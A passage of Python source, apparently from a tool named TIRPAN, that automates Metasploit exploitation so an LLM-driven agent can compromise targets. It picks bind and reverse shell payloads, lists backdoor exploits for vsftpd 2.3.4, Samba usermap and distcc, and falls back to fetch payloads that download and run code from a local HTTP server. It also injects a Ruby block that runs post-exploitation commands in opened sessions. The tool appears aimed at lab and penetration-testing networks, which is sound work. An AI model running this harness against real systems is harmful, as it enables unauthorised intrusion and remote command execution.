                m_inet = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", line)
                if m_inet:
                    triples.append((current_iface, m_inet.group(1), int(m_inet.group(2))))
                    continue
                m_inet2 = re.search(
                    r"inet (\d+\.\d+\.\d+\.\d+)\s+netmask\s+(\S+)", line
                )
                if m_inet2:
                    ip_str, mask_str = m_inet2.group(1), m_inet2.group(2)
                    try:
                        if mask_str.startswith("0x"):
                            prefix = bin(int(mask_str, 16)).count("1")
                        else:
                            prefix = sum(bin(int(o)).count("1") for o in mask_str.split("."))
                        triples.append((current_iface, ip_str, prefix))
                    except Exception:
                        pass
            return triples

        # ── Strategy 1: scan all interfaces ──────────────────────────────
        all_ifaces: list[tuple[str, str, int]] = []  # (iface, ip, prefix)
        try:
            if IS_WINDOWS:
                from core.platform_utils import IS_WINDOWS  # noqa: F811
                result = subprocess.run(
                    ["netsh", "interface", "ip", "show", "address"],
                    capture_output=True, text=True, timeout=5,
                )
                # Simpler parse for Windows
                for m in re.finditer(
                    r"IP Address:\s+(\d+\.\d+\.\d+\.\d+)", result.stdout
                ):
                    all_ifaces.append(("unknown", m.group(1), 24))
            else:
                for cmd in (["ip", "-4", "addr", "show"], ["ifconfig", "-a"]):
                    try:
                        result = subprocess.run(
                            cmd, capture_output=True, text=True, timeout=5
                        )
                        if result.returncode == 0 and result.stdout.strip():
                            all_ifaces = _parse_ip_prefix(result.stdout)
                            break
                    except FileNotFoundError:
                        continue
        except Exception:
            pass

        if all_ifaces:
            try:
                target = ipaddress.ip_address(target_ip)
            except ValueError:
                target = None

            # ── Prefer VPN/tunnel interfaces (HTB/THM/exam networks) ──────
            _VPN_IFACE_PREFIXES = ("tun", "tap", "ppp", "vpn", "wg")
            for iface, ip, prefix in all_ifaces:
                if ip.startswith("127."):
                    continue
                if any(iface.lower().startswith(p) for p in _VPN_IFACE_PREFIXES):
                    return ip

            # ── Same-subnet interface ────────────────────────────────────
            if target:
                for iface, ip, prefix in all_ifaces:
                    if ip.startswith("127."):
                        continue
                    try:
                        net = ipaddress.ip_network(f"{ip}/{prefix}", strict=False)
                        if target in net:
                            return ip
                    except ValueError:
                        continue

        # ── Strategy 2: kernel routing table (most reliable single call) ──
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect((target_ip, 80))
            ip = s.getsockname()[0]
            s.close()
            if ip and not ip.startswith("127."):
                return ip
        except Exception:
            pass

        # ── Strategy 3: any non-loopback address ──────────────────────────
        for _, ip, _ in all_ifaces:
            if not ip.startswith("127."):
                return ip

        return ""

    # Modules that trigger a backdoor/shell on the target and then inject a
    # payload command into that shell.  In classic MSF (< ~2022) this was done
    # via cmd/unix/interact which directly connected to the open port.  In
    # modern MSF, cmd/unix/interact has been removed; instead the module sends
    # a command into the backdoor shell to launch a bind/fetch payload.
    #
    # Bind payloads (bind_netcat, bind_perl, …) are preferred:
    #   • No LHOST required
    #   • No HTTP fetch server (avoids port-8080 clash with TIRPAN)
    #   • Work behind NAT/WSL
    #
    # Fetch payloads (cmd/linux/http/…) are a fallback only — they start an
    # HTTP listener on FETCH_SRVPORT (default 8080, but we override to 9090).
    _NATIVE_SHELL_MODULES: set[str] = {
        "exploit/unix/ftp/vsftpd_234_backdoor",
        "exploit/multi/samba/usermap_script",
        "exploit/unix/misc/distcc_exec",
    }

    # Payload candidates tried in order for native-shell modules.
    # cmd/unix/interact was removed from modern Metasploit — use bind payloads.
    _INTERACT_CANDIDATES: list[str] = [
        "cmd/unix/bind_netcat",          # Modern MSF default — inject nc into backdoor shell
        "cmd/unix/bind_perl",            # Fallback if netcat lacks -e support
        "cmd/unix/bind_ruby",            # Fallback if perl unavailable
        "cmd/unix/interact",             # Legacy MSF (kept for older installations)
    ]

    # Port for HTTP fetch payloads — must NOT conflict with TIRPAN (8080).
    _FETCH_SRVPORT: int = 9090

    # Default bind-shell payloads by module platform.
    # Bind-shells are preferred: they need no LHOST, work behind NAT/WSL.
    # Key = second path component of the module path (e.g. "unix" in exploit/unix/...).
    _PLATFORM_BIND_PAYLOAD: dict[str, str] = {
        "unix":    "cmd/unix/bind_netcat",
        "linux":   "cmd/unix/bind_netcat",
        "multi":   "cmd/unix/bind_netcat",
        "windows": "windows/x64/shell_bind_tcp",
        "osx":     "osx/x86/shell_bind_tcp",
        "android": "android/meterpreter/reverse_tcp",  # android: reverse only
    }
    _FALLBACK_BIND_PAYLOAD = "cmd/unix/bind_netcat"

    # Fallback payloads for non-native modules when primary payload is incompatible.
    # Buffer overflow modules (trans2open, etc.) often need staged payloads,
    # not cmd/* payloads.
    _PAYLOAD_FALLBACKS: list[str] = [
        "cmd/unix/bind_perl",
        "generic/shell_bind_tcp",
        "linux/x86/shell/bind_tcp",
        "cmd/unix/reverse_netcat",
    ]

    @classmethod
    def _is_native_shell_module(cls, module_path: str) -> bool:
        """Return True if the module spawns its own shell (no staged payload needed)."""
        return module_path in cls._NATIVE_SHELL_MODULES

    @classmethod
    def _default_payload(cls, module_path: str) -> str:
        """Return a platform-appropriate payload for the module.

        Native-shell modules (vsftpd, samba usermap, distcc) return empty string
        so the caller knows NOT to set PAYLOAD in the RC file.
        All other modules get a bind-shell payload so no LHOST is required.
        """
        if cls._is_native_shell_module(module_path):
            return ""  # let MSF auto-select
        parts = module_path.split("/")
        platform = parts[1].lower() if len(parts) > 1 else ""
        return cls._PLATFORM_BIND_PAYLOAD.get(platform, cls._FALLBACK_BIND_PAYLOAD)

    async def _run_via_msfconsole(self, params: dict) -> dict:
        """Run exploit via msfconsole subprocess when RPC is unavailable.

        Strategy:
        - Native-shell modules (vsftpd, samba usermap, distcc): do NOT set
          PAYLOAD — let MSF auto-select.  If that fails, retry with each
          candidate interact payload.
        - Other modules: prefer bind-shell payloads (no LHOST needed, works
          in WSL/NAT/VM environments).  Only set LHOST for explicit reverse
          payloads.
        """
        requested_module: str = params["module"]
        target_ip: str = params["target_ip"]
        target_port: int = int(params["target_port"])
        payload: str = params.get("payload", "")
        extra_opts: dict = params.get("options", {})
        module_path, module_err = await self._resolve_module_path_msfconsole(requested_module)
        if module_err:
            self._emit_msf_event("msfconsole_module_not_found", module=requested_module)
            return {
                "success": False,
                "output": {
                    "module": requested_module,
                    "canonical_module": self._MODULE_ALIASES.get(requested_module, requested_module),
                    "reason": "module_not_found",
                },
                "error": module_err,
            }

        is_native = self._is_native_shell_module(module_path)
        effective_payload = payload or self._default_payload(module_path)
        post_commands: list[str] = params.get("post_commands") or []

        # Extend timeout when post_commands are present:
        # sleep(2) + up to 15s per command + 5s buffer each
        post_timeout_extra = len(post_commands) * 20 if post_commands else 0
        exploit_timeout = MSF_CONSOLE_TIMEOUT + post_timeout_extra
        logger.info(
            "[TIRPAN-DEBUG] timeout=%ds (base=%ds + post_extra=%ds for %d post_commands)",
            exploit_timeout, MSF_CONSOLE_TIMEOUT, post_timeout_extra, len(post_commands),
        )

        start = time.monotonic()
        logger.info("Running exploit via msfconsole: %s → %s:%s", module_path, target_ip, target_port)

        if is_native:
            # Native-shell modules ALWAYS go through the native exploit path,
            # even if the LLM specified an explicit payload. This ensures:
            # 1. Stale backdoor port cleanup (e.g. port 6200 for vsftpd)
            # 2. Proper bind-payload candidate iteration
            # 3. Fetch payload fallback on non-conflicting port
            # If the LLM specified a payload, try it first as the initial candidate.
            output = await self._try_native_shell_exploit(
                module_path, target_ip, target_port, extra_opts,
                post_commands=post_commands,
                timeout=exploit_timeout,
                preferred_payload=payload or None,
            )
        else:
            output = await self._try_exploit_with_payload(
                module_path, target_ip, target_port, effective_payload, extra_opts,
                post_commands=post_commands,
                timeout=exploit_timeout,
            )
            # If payload was incompatible, retry with fallback payloads
            if not _session_opened(output) and "not a compatible payload" in output:
                logger.info("Payload %s incompatible with %s — trying fallbacks",
                            effective_payload, module_path)
                for fb_payload in self._PAYLOAD_FALLBACKS:
                    if fb_payload == effective_payload:
                        continue
                    output = await self._try_exploit_with_payload(
                        module_path, target_ip, target_port, fb_payload, extra_opts,
                        post_commands=post_commands,
                        timeout=exploit_timeout,
                    )
                    if _session_opened(output):
                        logger.info("Fallback payload %s succeeded for %s", fb_payload, module_path)
                        break

        duration = time.monotonic() - start

        success = _session_opened(output)
        session_id = None
        m = re.search(r"session\s+(\d+)\s+opened", output, re.IGNORECASE)
        if m:
            session_id = int(m.group(1))

        error_msg = None
        if success:
            pass
        elif "Backdoor already in-use" in output or "already exploited" in output.lower():
            error_msg = (
                "Target already exploited: backdoor/shell already in use (e.g. port 6200). "
                "Reset the target VM or use an existing session. Try another exploit (e.g. Samba usermap)."
            )
        else:
            error_msg = "No session opened"

        # Extract post-command output from [TIRPAN_CMD_OUT:N] tagged lines.
        # ERB block prints these using framework.sessions API — never local exec.
        post_output: str | None = None
        # Strip ANSI escape codes for clean parsing
        _ansi_re = re.compile(r"\x1b\[[0-9;]*[mGKHF]")
        clean_output = _ansi_re.sub("", output)
        logger.debug("[TIRPAN-DEBUG] clean_output (ANSI stripped, %d chars):\n%s",
                     len(clean_output), clean_output[:6000])

        if post_commands:
            # Parse all [TIRPAN_CMD_OUT:N] lines regardless of success
            # (so we can detect the "no session" case vs actual output)
            out_lines: list[str] = []
            for line in clean_output.splitlines():
                m2 = re.search(r'\[TIRPAN_CMD_OUT:\d+\] (.+)', line)
                if m2:
                    out_lines.append(m2.group(1))
            logger.info("[TIRPAN-DEBUG] post_command_output parsed %d lines from [TIRPAN_CMD_OUT] tags",
                        len(out_lines))

            # Also log TIRPAN debug/info lines for visibility
            for line in clean_output.splitlines():
                if "[TIRPAN" in line:
                    logger.info("[TIRPAN-DEBUG] ERB output line: %s", line.strip())

            if out_lines:
                post_output = "\n".join(out_lines)
                logger.info("[TIRPAN-DEBUG] post_output (%d chars):\n%s",
                            len(post_output), post_output[:3000])
            else:
                logger.warning("[TIRPAN-DEBUG] post_commands were set but NO [TIRPAN_CMD_OUT] lines found. "
                               "Possible causes: (1) exploit failed, (2) ERB block not executed, "
                               "(3) shell_command_token failed, (4) msfconsole version too old for ERB.")

        used_payload = effective_payload if not is_native else "(auto)"
        result = ExploitResult(
            success=success,
            module=module_path,
            target_ip=target_ip,
            target_port=target_port,
            payload=used_payload,
            session_id=session_id,
            output=output[:3000],
            error=error_msg,
            duration_seconds=duration,
        )
        result_dict = result.model_dump()
        if requested_module != module_path:
            result_dict["module_alias_resolved_from"] = requested_module
        if post_output is not None:
            result_dict["post_command_output"] = post_output[:3000]
        return {
            "success": result.success,
            "output": result_dict,
            "error": result.error,
            "post_output": post_output[:3000] if post_output is not None else None,
        }

    @staticmethod
    def _kill_stale_backdoor_port(target_ip: str, port: int = 6200, timeout: float = 3.0) -> bool:
        """Connect to a stale vsftpd backdoor shell on *port* and close it.

        When the vsftpd_234_backdoor exploit triggers but the payload fails to
        inject, the backdoor bind-shell stays listening on port 6200.  A
        subsequent exploit attempt finds it "already in-use" and aborts.

        Fix: connect, optionally send 'exit', and close — this kills the shell
        process on the target so the port is freed for the next attempt.

        Returns True if the port was open and we connected (cleaned up).
        Returns False if the port was already closed (no cleanup needed).
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target_ip, port))
            try:
                s.sendall(b"exit\n")
            except Exception:
                pass
            s.close()
            logger.info(
                "[MSF] Stale backdoor shell on %s:%d detected and killed.", target_ip, port
            )
            return True
        except (ConnectionRefusedError, OSError):
            return False  # port already closed — nothing to do

    async def _try_native_shell_exploit(
        self,
        module_path: str,
        target_ip: str,
        target_port: int,
        extra_opts: dict,
        post_commands: list[str] | None = None,
        timeout: int = MSF_CONSOLE_TIMEOUT,
        preferred_payload: str | None = None,
    ) -> str:
        """Try native-shell exploit with bind payload candidates.

        Modern Metasploit removed cmd/unix/interact.  These modules now inject
        a payload command into the backdoor shell.  We try bind payloads first
        (no LHOST, no HTTP server, no port conflicts), then fall back to a fetch
        payload on a non-conflicting port if all bind candidates fail.

        We deliberately skip the "no explicit payload" attempt: omitting PAYLOAD
        in modern MSF causes the globally configured fetch payload
        (cmd/linux/http/x86/meterpreter_reverse_tcp) to be used, which tries to
        start an HTTP listener on port 8080 — the same port TIRPAN listens on.
        """
        last_output = ""

        # ── Pre-flight: clear any stale backdoor shell on port 6200 ───────────
        # If a previous run left a bind-shell open on 6200, the module will see
        # "Already exploited?" and abort.  Connect and send 'exit' to free it.
        if "vsftpd_234_backdoor" in module_path:
            cleaned = await asyncio.to_thread(
                self._kill_stale_backdoor_port, target_ip, 6200
            )
            if cleaned:
                logger.info("[MSF] Cleared stale port 6200 — waiting 2s before exploit")
                await asyncio.sleep(2)

        # ── Pass 1: try bind payloads (preferred — no LHOST, no port conflict) ─
        # If caller specified a preferred payload, prepend it to the candidate list
        # (deduplicating so we don't try it twice if it's already in the list).
        candidates = list(self._INTERACT_CANDIDATES)
        if preferred_payload and preferred_payload not in candidates:
            candidates.insert(0, preferred_payload)
        for candidate in candidates:
            logger.info(
                "[MSF] Trying %s with payload %s → %s:%s",
                module_path, candidate, target_ip, target_port,
            )
            commands = self._build_rc_commands(
                module_path, target_ip, target_port, candidate, extra_opts,
                post_commands=post_commands,
            )
            logger.debug("[MSF] RC script:\n%s", "\n".join(commands))
            output = await self._run_msfconsole(commands, timeout=timeout)
            logger.info("[MSF] Output (800 chars):\n%s", output[:800])
            last_output = output

            if _session_opened(output):
                return output
            if "Backdoor already in-use" in output or "already exploited" in output.lower():
                return output

            # CRITICAL: if the backdoor was spawned but payload failed, port 6200 is now
            # occupied on the target. Any further payload attempt will find port 6200
            # "already open / not fresh shell" and fail.
            # FIX: kill the stale shell on 6200 and retry the SAME payload once.
            if "Backdoor has been spawned" in output and not _session_opened(output):
                logger.warning(
                    "[MSF] Backdoor triggered by %s but payload connection failed — "
                    "killing stale port 6200 and retrying once.",
                    candidate,
                )
                cleaned = await asyncio.to_thread(
                    self._kill_stale_backdoor_port, target_ip, 6200
                )
                if cleaned:
                    await asyncio.sleep(2)
                    output = await self._run_msfconsole(commands, timeout=timeout)
                    logger.info("[MSF] Retry output (800 chars):\n%s", output[:800])
                    if _session_opened(output):
                        return output
                return output

            # "Cooldown" = timing issue: backdoor triggered but MSF couldn't connect
            # in time. Kill stale 6200 shell and retry the same payload.
            if "Cooldown" in output and "vsftpd_234_backdoor" in module_path:
                logger.warning(
                    "[MSF] vsftpd backdoor Cooldown with %s — killing stale 6200 and retrying",
                    candidate,
                )
                cleaned = await asyncio.to_thread(
                    self._kill_stale_backdoor_port, target_ip, 6200
                )
                if cleaned:
                    await asyncio.sleep(2)
                output = await self._run_msfconsole(commands, timeout=timeout)
                logger.info("[MSF] Cooldown retry output (800 chars):\n%s", output[:800])
                if _session_opened(output):
                    return output
                last_output = output
                continue   # try next candidate if still failed

            # NOTE: "The value specified for PAYLOAD is not valid." comes from
            # `set --clear PAYLOAD` and is a FALSE POSITIVE — do NOT match it.
            # Only match genuine payload incompatibility messages from MSF.
            if "is not compatible" in output or "No compatible payloads" in output or "Invalid payload" in output:
                logger.warning("[MSF] Payload %s not compatible, trying next candidate", candidate)
                continue
            # Other failure (e.g. connection refused) — try next candidate
            if "Connection refused" in output or "Failed to connect" in output:
                logger.warning("[MSF] Connection failed with %s, trying next", candidate)
                continue

        # ── Pass 2: fetch payload fallback on non-conflicting port ────────────
        # Use cmd/linux/http/x86/shell_reverse_tcp with FETCH_SRVPORT=9090
        # (avoids the default 8080 which conflicts with TIRPAN web server).
        fetch_payload = "cmd/linux/http/x86/shell_reverse_tcp"
        fetch_opts = dict(extra_opts)
        fetch_opts["FETCH_SRVPORT"] = str(self._FETCH_SRVPORT)
        logger.info(
            "[MSF] Bind payloads failed — trying fetch fallback: %s (FETCH_SRVPORT=%d)",
            fetch_payload, self._FETCH_SRVPORT,
        )
        commands = self._build_rc_commands(
            module_path, target_ip, target_port, fetch_payload, fetch_opts,
            post_commands=post_commands,
        )
        logger.debug("[MSF] Fetch fallback RC script:\n%s", "\n".join(commands))
        output = await self._run_msfconsole(commands, timeout=timeout)
        logger.info("[MSF] Fetch fallback output (800 chars):\n%s", output[:800])

        if _session_opened(output):
            return output
        if "Backdoor already in-use" in output or "already exploited" in output.lower():
            return output

        # Return last bind attempt output (more informative than fetch failure)
        return last_output or output

    async def _try_exploit_with_payload(
        self,
        module_path: str,
        target_ip: str,
        target_port: int,
        payload: str,
        extra_opts: dict,
        post_commands: list[str] | None = None,
        timeout: int = MSF_CONSOLE_TIMEOUT,
    ) -> str:
        """Run an exploit with an explicit payload."""
        commands = self._build_rc_commands(
            module_path, target_ip, target_port, payload, extra_opts,
            post_commands=post_commands,
        )
        return await self._run_msfconsole(commands, timeout=timeout)

    @staticmethod
    def _ruby_escape(s: str) -> str:
        """Escape a string for embedding in a Ruby double-quoted string literal."""
        return s.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n").replace("\r", "\\r")

    def _build_post_commands_erb(self, post_commands: list[str]) -> str:
        """Build a msfconsole ERB <ruby> block that runs post_commands on the last opened session.

        WHY ERB/Ruby instead of inline RC commands:
        - `run` (interactive) in RC: if exploit fails, subsequent commands are
          interpreted by msfconsole as local shell `exec:` calls — dangerous.
        - `run -z` + ERB block: uses framework.sessions API directly. If no
          session exists (exploit failed), the `if sid` guard prevents any
          execution. Commands NEVER run locally.

        Output format: each command output line is prefixed with
        [TIRPAN_CMD_OUT:N] for reliable parsing from msfconsole stdout.
        """
        ruby_cmds = "[" + ", ".join(f'"{self._ruby_escape(cmd)}"' for cmd in post_commands) + "]"
        logger.debug("[TIRPAN-DEBUG] ERB ruby_cmds literal: %s", ruby_cmds)
        lines = [
            "<ruby>",
            "# TIRPAN post-exploitation block — runs after run -z",
            "# Uses framework.sessions API: safe when exploit fails (no local exec)",
            "sleep(2)  # let session fully register in framework.sessions",
            "sid = framework.sessions.keys.map { |k| k.to_i }.max",
            f"_tirpan_cmds = {ruby_cmds}",
            'print_good("[TIRPAN-DEBUG] framework.sessions count=#{framework.sessions.length} last_sid=#{sid.inspect}")',
            'if sid && (s = framework.sessions[sid])',
            '  stype = s.respond_to?(:type) ? s.type : "unknown"',
            '  print_good("[TIRPAN] post_cmd session=#{sid} type=#{stype}")',
            '  _tirpan_cmds.each_with_index do |cmd, idx|',
            '    print_good("[TIRPAN_CMD_START:#{idx}] #{cmd}")',
            '    begin',
            '      out = s.shell_command_token(cmd, 15)',
            '      if (out.nil? || out.to_s.strip.empty?) && s.respond_to?(:write) && s.respond_to?(:read)',
            '        begin',
            '          s.write(cmd + "\\n")',
            '          sleep(1)',
            '          out = s.read',
            '          print_good("[TIRPAN-DEBUG] fallback read for cmd #{idx}")',
            '        rescue => e2',
            '          print_error("[TIRPAN_CMD_FALLBACK_ERR:#{idx}] #{e2.class}: #{e2.message}")',
            '        end',
            '      end',
            '      out_str = (out || "").strip',
            '      print_good("[TIRPAN-DEBUG] cmd #{idx} raw output length=#{out_str.length}")',
            '      out_str.each_line { |line| print_good("[TIRPAN_CMD_OUT:#{idx}] #{line.chomp}") }',
            '    rescue => e',
            '      print_error("[TIRPAN_CMD_ERR:#{idx}] #{e.class}: #{e.message}")',
            '    end',
            '    print_good("[TIRPAN_CMD_END:#{idx}]")',
            '  end',
            'else',
            '  print_error("[TIRPAN] No session opened — post_commands skipped (exploit failed or session not in framework)")',
            'end',
            '</ruby>',
        ]
        erb_block = "\n".join(lines)
        logger.debug("[TIRPAN-DEBUG] ERB block to embed in RC:\n%s", erb_block)
        return erb_block

    @staticmethod
    def _is_port_free(port: int) -> bool:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", port))
            return True
        except OSError:
            return False
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _allocate_lport(self) -> int:
        span = max(1, _LPORT_POOL_END - _LPORT_POOL_START)
        with _lport_lock:
            for _ in range(span):
                port = next(_lport_counter)
                if self._is_port_free(port):
                    return port
        raise RuntimeError("No free LPORT available in pool")

    def _build_rc_commands(
        self,
        module_path: str,
        target_ip: str,
        target_port: int,
        payload: str,
        extra_opts: dict,
        post_commands: list[str] | None = None,
    ) -> list[str]:
        """Build msfconsole RC commands for an exploit.

        CRITICAL: Use 'set --clear PAYLOAD' (not just 'unset') after loading the
        module. MSF's global datastore (~/.msf4/) can set a stale payload (e.g.
        meterpreter_reverse_tcp) that survives 'unsetg'/'unset' and gets
        re-applied when the module loads. 'set --clear PAYLOAD' fully removes
        the configured value AND the default, so the module picks its own
        compatible payload (e.g. cmd/unix/interact for vsftpd_234_backdoor).

        LHOST/LPORT are set only for reverse payloads and only for modules that
        are not native-shell backdoor style exploits (vsftpd/usermap/distcc).
        Native-shell modules often do not expose LHOST/LPORT and error with:
        "Invalid option 'LHOST'."

        POST_COMMANDS: When provided, appended as an ERB Ruby block that uses
        framework.sessions API after `run -z`. This is the ONLY safe approach:
        - `run` (interactive) + inline cmds = local exec if exploit fails
        - `run -z` + ERB block = API-level, never runs locally
        """
        lhost = self._get_lhost(target_ip)

        # Auto-allocate LPORT to avoid conflicts when multiple exploit agents
        # run concurrently.  Only used for reverse payloads (LHOST needed).
        # Bind payloads don't start a local handler so LPORT doesn't matter.
        is_reverse = payload and any(
            kw in payload.lower() for kw in ("reverse", "meterpreter")
        )
        auto_lport: int | None = None
        is_native = self._is_native_shell_module(module_path)
        if is_reverse and not is_native and "LPORT" not in extra_opts:
            auto_lport = self._allocate_lport()
            logger.debug("Auto-allocated free LPORT=%d for %s", auto_lport, module_path)

        commands = [
            "unsetg PAYLOAD",
            "unsetg LHOST",
            f"use {module_path}",
            # 'unset PAYLOAD' clears both user-set and global PAYLOAD values.
            # Prefer 'unset' over 'set --clear' for broader MSF version compatibility.
            "unset PAYLOAD",
            "unset LHOST",
            f"set RHOSTS {target_ip}",
            f"set RPORT {target_port}",
        ]

        if payload:
            logger.debug("Setting explicit payload: %s", payload)
            commands.append(f"set PAYLOAD {payload}")

        # Set LHOST only for reverse payloads on non-native modules.
        if is_reverse and not is_native and lhost:
            logger.debug("Setting LHOST=%s for %s", lhost, target_ip)
            commands.append(f"set LHOST {lhost}")

        if auto_lport is not None:
            commands.append(f"set LPORT {auto_lport}")

        # Add extra options — skip LHOST/LPORT keys we already set above
        # to avoid duplicate RC commands.
        _skip_keys = {"LHOST", "LPORT"}
        for key, val in extra_opts.items():
            if key.upper() in _skip_keys:
                continue
            commands.append(f"set {key} {val}")

        # Always use run -z (background) — never interactive `run` which causes
        # subsequent RC commands to execute locally when exploit fails.
        commands.append("run -z")

        if post_commands:
            logger.info("[TIRPAN-DEBUG] Adding ERB post_commands block (%d commands): %s",
                        len(post_commands), post_commands)
            commands.append(self._build_post_commands_erb(post_commands))

        return commands

    async def _search_via_msfconsole(self, query: str) -> dict:
        """Search Metasploit modules via msfconsole subprocess."""
        if not query.strip():
            return {"success": False, "output": None, "error": "Query cannot be empty"}

        commands = [f"search {query}"]
        output = await self._run_msfconsole(commands, timeout=60)

        # Parse lines like:
        #   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  ...
        modules = []
        for line in output.splitlines():
            line = line.strip()
            if re.match(r"^\d+\s+\S+/\S+", line):
                parts = line.split()
                if len(parts) >= 2:
                    modules.append(parts[1])

        return {
            "success": True,
            "output": {"query": query, "modules": modules[:50], "raw": output[:2000]},
            "error": None,
        }

    async def _sessions_via_msfconsole(self) -> dict:
        """List active sessions via msfconsole subprocess."""
        commands = ["sessions -l"]
        output = await self._run_msfconsole(commands, timeout=60)
        return {
            "success": True,
            "output": {"raw": output[:2000], "sessions": {}, "count": 0},
            "error": None,
        }

    async def _session_exec_via_msfconsole(self, params: dict) -> dict:
        """Execute a command on a session via msfconsole subprocess."""
        session_id = int(params["session_id"])
        command = params["command"].strip()

        commands = [
            f"sessions -i {session_id}",
            command,
            "",  # empty line to flush
            "background",
        ]
        output = await self._run_msfconsole(commands, timeout=_CMD_TIMEOUT)

        # Check for common errors
        if "Invalid session" in output or "not found" in output.lower():
            return {
                "success": False,
                "output": None,
                "error": (
                    f"Session {session_id} is not valid or has been closed. "
                    "msfconsole fallback does not persist sessions between calls — "
                    "sessions only exist while the msfconsole process is running. "
                    "Solution: pass 'post_commands' in the original 'run' call to execute "
                    "commands in the same msfconsole invocation, or start msfrpcd for "
                    "persistent session support."
                ),
            }

        return {
            "success": True,
            "output": {
                "session_id": session_id,
                "command": command,
                "result": output[:3000],
            },
            "error": None,
        }

    # ------------------------------------------------------------------
    # Connection management
    # ------------------------------------------------------------------

    async def _get_client(self):
        """Lazy connection — connect on first call, then use cached client."""
        if self._client is not None:
            return self._client

        loop = asyncio.get_running_loop()
        self._client = await loop.run_in_executor(None, self._connect)
        return self._client

    def _connect(self):
        from pymetasploit3.msfrpc import MsfRpcClient  # noqa: PLC0415
        cfg = settings.msf
        try:
            return MsfRpcClient(
                cfg.password,
                server=cfg.host,
                port=cfg.port,
                ssl=cfg.ssl,
            )
        except Exception as exc:
            logger.warning(
                "MsfRpcClient connection failed (host=%s port=%s): %s — use msfconsole fallback or start msfrpcd",
                cfg.host, cfg.port, exc,
            )
            raise

    async def is_available(self) -> bool:
        """Is msfrpcd reachable?"""
        try:
            await self._get_client()
            return True
        except Exception:
            self._client = None
            return False

    def disconnect(self) -> None:
        self._client = None
